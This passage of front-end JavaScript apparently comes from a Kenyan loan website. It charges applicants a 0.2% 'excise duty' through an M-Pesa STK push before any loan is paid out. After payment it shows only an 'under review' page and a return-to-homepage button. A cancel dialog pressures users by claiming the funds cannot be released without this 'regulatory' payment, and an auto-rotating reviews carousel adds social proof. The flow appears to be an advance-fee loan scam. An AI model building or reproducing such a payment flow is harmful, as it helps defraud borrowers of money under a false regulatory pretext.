    showError(excisePhoneInput, false);

    const rawData = localStorage.getItem(STORAGE_KEY_DATA);
    if (!rawData) return;
    const appData = JSON.parse(rawData);
    const amount = parseInt(appData.loanAmount, 10);
    const exciseDuty = Math.round(amount * 0.002);

    const formattedTargetPhone = formatKenyanPhone(cleanPhone);
    document.getElementById('sending-phone-val').textContent = formattedTargetPhone;

    setExciseState('sending');

    try {
      // Call backend to generate STK Push via Daraja API
      const response = await fetch('/api/request-stk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: cleanPhone, amount: exciseDuty })
      });

      const resData = await response.json();
      
      if (!response.ok || !resData.success) {
        throw new Error(resData.message || 'M-Pesa API initiation failed');
      }

      if (resData.alreadyPaid) {
        renderUnderReviewPage(formattedTargetPhone);
        return;
      }

      currentCheckoutRequestId = resData.checkoutRequestId;
      localStorage.setItem(STORAGE_KEY_CHECKOUT_ID, currentCheckoutRequestId);
      localStorage.setItem(STORAGE_KEY_PAYMENT_PHONE, formattedTargetPhone);
      startPaymentPolling(currentCheckoutRequestId, formattedTargetPhone);

    } catch (err) {
      console.error('[STK Push Error]', err.message);
      
      const Toast = Swal.mixin({
        toast: true,
        position: 'top-end',
        showConfirmButton: false,
        timer: 4500,
        timerProgressBar: true,
        didOpen: (toast) => {
          toast.addEventListener('mouseenter', Swal.stopTimer);
          toast.addEventListener('mouseleave', Swal.resumeTimer);
        }
      });
      
      Toast.fire({
        icon: 'error',
        title: 'Failed to initiate M-Pesa payment: ' + err.message
      });

      setExciseState('idle');
    }
  });

  // Retry STK payment flow on error view
  document.getElementById('retry-stk-btn').addEventListener('click', async () => {
    // Check if payment was made in the background before going back to idle
    const rawData = localStorage.getItem(STORAGE_KEY_DATA);
    if (rawData) {
      try {
        const data = JSON.parse(rawData);
        const phoneToQuery = data.phoneNumber;
        if (phoneToQuery) {
          const response = await fetch(`/api/check-payment-status?phone=${encodeURIComponent(phoneToQuery)}`);
          if (response.ok) {
            const resData = await response.json();
            if (resData.success && resData.status === 'success') {
              localStorage.removeItem(STORAGE_KEY_CHECKOUT_ID);
              localStorage.removeItem(STORAGE_KEY_PAYMENT_PHONE);
              renderUnderReviewPage(formatKenyanPhone(phoneToQuery));
              return;
            }
          }
        }
      } catch (err) {
        console.error('[RETRY CHECK ERROR]', err);
      }
    }
    setExciseState('idle');
  });

  // Cancel / Exit excise payment
  document.getElementById('cancel-excise-btn').addEventListener('click', () => {
  // Use custom modal for cancel confirmation
  showCancelConfirmModal();
});

  function renderUnderReviewPage(phoneUsedForPayment) {
    const rawData = localStorage.getItem(STORAGE_KEY_DATA);
    if (!rawData) {
      showView('landing');
      return;
    }
    
    const data = JSON.parse(rawData);
    const amount = parseInt(data.loanAmount, 10);

    document.getElementById('review-loan-category').textContent = data.loanCategory;
    document.getElementById('review-disburse-amount').textContent = formatKsh(amount);
    document.getElementById('review-phone-destination').textContent = phoneUsedForPayment;

    showView('underReview');
  }

  // Restart flow / Return to Homepage
  document.getElementById('finish-review-btn').addEventListener('click', () => {
    showView('landing');
  });

  // Helper for back navigation confirmation using beautiful SweetAlert2
  function showBackConfirmModal() {
    Swal.fire({
      title: 'Exit Application?',
      text: 'Are you sure you want to go back to the homepage? Your entered details will remain saved in draft form, but you will need to re-verify to continue your loan approval.',
      icon: 'warning',
      showCancelButton: true,
      confirmButtonText: 'Yes, Exit Form',
      cancelButtonText: 'No, Keep Editing',
      confirmButtonColor: '#ef4444', // red warning to exit
      cancelButtonColor: '#0f766e',  // primary teal to keep editing
      background: '#ffffff',
      color: '#0f172a'
    }).then((result) => {
      if (result.isConfirmed) {
        showView('landing');
      }
    });
  }

  function showCancelConfirmModal() {
    Swal.fire({
      title: 'Cancel Payment?',
      text: 'Are you sure you want to cancel the Excise Duty authorization? Your loan offer is reserved, but we cannot disburse the funds without the regulatory 0.2% excise payment.',
      icon: 'warning',
      showCancelButton: true,
      confirmButtonText: 'Yes, Cancel Payment',
      cancelButtonText: 'No, Complete Payment',
      confirmButtonColor: '#ef4444', // red warning to cancel
      cancelButtonColor: '#0f766e',  // primary teal to complete payment
      background: '#ffffff',
      color: '#0f172a'
    }).then((result) => {
      if (result.isConfirmed) {
        if (pollingIntervalId) {
          clearInterval(pollingIntervalId);
          pollingIntervalId = null;
        }
        localStorage.removeItem(STORAGE_KEY_CHECKOUT_ID);
        localStorage.removeItem(STORAGE_KEY_PAYMENT_PHONE);
        showView('landing');
      }
    });
  }

  // ==========================================================================
  // 10. REVIEWS CAROUSEL INTERACTIVE SLIDING LOGIC
  // ==========================================================================
  const reviewsTrack = document.getElementById('reviews-track');
  const reviewSlides = document.querySelectorAll('.review-slide');
  const carouselDots = document.querySelectorAll('#carousel-dots-container .dot');
  const carouselPrevBtn = document.getElementById('carousel-prev-btn');
  const carouselNextBtn = document.getElementById('carousel-next-btn');
  let activeReviewIndex = 0;
  const totalReviews = reviewSlides.length;

  function updateReviewsCarousel(index) {
    // Wrap around logic
    if (index >= totalReviews) {
      activeReviewIndex = 0;
    } else if (index < 0) {
      activeReviewIndex = totalReviews - 1;
    } else {
      activeReviewIndex = index;
    }

    // Apply smooth sliding translate transform
    if (reviewsTrack) {
      reviewsTrack.style.transform = `translateX(-${activeReviewIndex * 100}%)`;
    }

    // Update active class on slides
    reviewSlides.forEach((slide, idx) => {
      if (idx === activeReviewIndex) {
        slide.classList.add('active');
      } else {
        slide.classList.remove('active');
      }
    });

    // Update active class on dots
    carouselDots.forEach((dot, idx) => {
      if (idx === activeReviewIndex) {
        dot.classList.add('active');
      } else {
        dot.classList.remove('active');
      }
    });
  }

  // Dot navigation click handlers
  carouselDots.forEach(dot => {
    dot.addEventListener('click', () => {
      const targetIdx = parseInt(dot.getAttribute('data-index'), 10);
      updateReviewsCarousel(targetIdx);
    });
  });

  // Prev / Next button click handlers
  if (carouselPrevBtn) {
    carouselPrevBtn.addEventListener('click', () => {
      updateReviewsCarousel(activeReviewIndex - 1);
    });
  }

  if (carouselNextBtn) {
    carouselNextBtn.addEventListener('click', () => {
      updateReviewsCarousel(activeReviewIndex + 1);
    });
  }

  // Swipe support for touch screens
  let touchStartX = 0;
  let touchEndX = 0;

  if (reviewsTrack) {
    reviewsTrack.addEventListener('touchstart', (e) => {
      touchStartX = e.changedTouches[0].screenX;
    }, { passive: true });

    reviewsTrack.addEventListener('touchend', (e) => {
      touchEndX = e.changedTouches[0].screenX;
      handleSwipeGesture();
    }, { passive: true });
  }

  function handleSwipeGesture() {
    const swipeThreshold = 50; // minimum pixels moved to trigger swipe
    if (touchStartX - touchEndX > swipeThreshold) {
      // Swiped left -> show next review
      updateReviewsCarousel(activeReviewIndex + 1);
    } else if (touchEndX - touchStartX > swipeThreshold) {
      // Swiped right -> show prev review
      updateReviewsCarousel(activeReviewIndex - 1);
    }
  }

  // Auto-play feature (optional, but highly premium!)
  let autoPlayInterval = setInterval(() => {
    updateReviewsCarousel(activeReviewIndex + 1);
  }, 6000); // Rotate every 6 seconds

  // Pause auto-play when hovering over reviews
  const reviewsContainer = document.querySelector('.carousel-container');
  if (reviewsContainer) {
    reviewsContainer.addEventListener('mouseenter', () => {
      clearInterval(autoPlayInterval);
    });
    reviewsContainer.addEventListener('mouseleave', () => {
      autoPlayInterval = setInterval(() => {
        updateReviewsCarousel(activeReviewIndex + 1);
      }, 6000);
    });
  }



});

